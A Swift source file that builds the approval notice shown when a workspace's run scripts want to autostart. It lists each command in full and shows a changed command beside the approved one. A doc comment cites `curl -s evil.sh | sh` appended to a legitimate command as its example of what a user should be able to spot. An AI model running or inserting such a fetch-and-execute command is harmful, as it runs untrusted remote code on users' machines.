import Foundation

/// What the notice at the top of a workspace says when its run scripts ask to start on their own
/// and the owner has not approved exactly those commands.
///
/// **It names every command it is asking about, in full.** An approval is of the exact text, so
/// the question has to show the exact text: "Vite wants to autostart" is a question nobody can
/// answer responsibly, and `php artisan horizon && curl -s evil.sh | sh` is one anybody can.
/// For a command that changed, the approved text is shown beside the new one, because the
/// difference between them is the whole question.
public struct RunScriptAutostartNotice: Sendable, Hashable {
    public struct Line: Sendable, Hashable, Identifiable {
        public var script: RunScript
        /// The command approved last for this script, shown struck through beside `command`, or
        /// nil when there was none.
        public var approved: String?

        public var id: String { script.id }
        public var name: String { script.name }
        public var command: String { script.command }
    }

    public var title: String
    public var lines: [Line]
    public var allowTitle: String
    /// What an approval covers when Allow is pressed: every script that asks, not only the ones
    /// listed. See `RunScriptAutostart.ask`.
    public var scripts: [RunScript]

    /// Nil for any decision that is not a question.
    public static func make(project: String, decision: RunScriptAutostart) -> RunScriptAutostartNotice? {
        guard case .ask(let scripts, let changes) = decision else { return nil }
        let allow = "Allow for \(project)"

        // Never approved anything, or only scripts that are new since: a request, not a change.
        guard changes.contains(where: { $0.approved != nil }) else {
            let asking = changes.isEmpty ? scripts : changes.map(\.script)
            let count = asking.count == 1 ? "1 run script" : "\(asking.count) run scripts"
            return RunScriptAutostartNotice(
                title: "\(project) wants to start \(count) when a workspace opens",
                lines: asking.map { Line(script: $0, approved: nil) },
                allowTitle: allow,
                scripts: scripts
            )
        }

        let title = changes.count == 1
            ? "A run script changed since you allowed it"
            : "\(changes.count) run scripts changed since you allowed them"
        return RunScriptAutostartNotice(
            title: title,
            lines: changes.map { Line(script: $0.script, approved: $0.approved) },
            allowTitle: allow,
            scripts: scripts
        )
    }
}
